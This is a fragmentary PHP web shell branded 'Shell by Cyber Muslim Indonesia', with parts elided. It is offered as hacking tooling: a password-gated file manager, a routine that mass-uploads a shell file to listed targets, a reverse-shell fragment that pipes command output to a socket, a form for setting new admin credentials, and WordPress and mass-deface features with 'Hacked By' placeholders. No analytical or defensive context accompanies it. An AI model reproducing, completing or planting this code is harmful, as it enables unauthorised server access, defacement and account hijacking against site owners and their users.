<?php
$auth_pass = "61243c7b9a4022cb3f8dc3106767ed12";
session_start();
error_reporting(0);
set_time_limit(0);
...
<html>
<head>
<title>AhmadMaZulpahwan7 by Muslim Cyber Indonesia</title>
...
<fieldset>
            <label for="login">Nama Samaran Saya</label>
        <form method="post">
<input type="text" name="id" value="AhmadMaZulPahwan">
</form>
Passwordnya Nama Panggilan Ane..?
<form method="post">
...
<html>
<head>
<title>Shell by Cyber Muslim Indonesia</title>
<meta name='author' content='Shell From AhmadMaZulpahwan7'>
<meta charset="UTF-8">
<link href='http://i.imgur.com/7d5rIQm.png' rel='icon' type='image/x-icon'/>
<style type='text/css'>
...
echo "<BR>";
echo "<center><font size='6px' color='lavender'>Shell Muslim Cyber Indonesia</font>";
echo "<br>";
echo "<p>";
...
echo "<li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface From AhmadMaZulpahwan7</a> </li>";
...
<select class='inputz' size="1" name="ope" style="background:red;color:blue;">
...
echo "<from><center><h3><font size=4 face=chiller color=blue>LugiX SHell Code</h3></center><textarea cols=70 rows=20 style='onfocus();font-weight:bold;color:red;background-image: transparent;opacity:0.40;background-size:100%;background-repeat: no-repeat;' class='inputz' readonly>".$html."</textarea><BR/><BR/></center></from>";
?>
...
<tr><td><center><font color="gold">Discovering And Exploiting Security Flaws.
    <p><font color="Lavender">Thanks To : AhmadMaZulpahwan7</font>
<br><a href="https://www.facebook.com">JOIN TO GROUP OFFICIAL AhmadMaZulPahwan</a>
    <br><font color="Lavender"><font></font> <br>Shell Backador Create By From AhmadMaZulpahwan7
</td></tr>
...
?>
<form method="post">
<input type="submit" name="s" value="AhmadMaZulpahwan7.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
    foreach($targets as $korba) {
        $globa = "AhmadMaZulpahwan7.php";
        ...
        echo "Done AhmadMaZulpahwan7.php<br>";
...
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
    ...
    if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='AhmadMaZulpahwan7' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='AhmadMaZulpahwan7' placeholder='pass_baru'><br>
...
echo "<center><form method='post'>
        ...
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='AhmadMaZulpahwan7'><br>
        <u>Domains</u>: <br>
...
echo "</center></table>";  
    ...
    if($_POST['auto_deface_wp']) {
        ...
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By AhmadMaZulpahwan7' required><br>
    ...
    echo "<center>Copyright @ ".date("Y")." - AhmadMaZulpahwan7</font></a></center>";
}
?>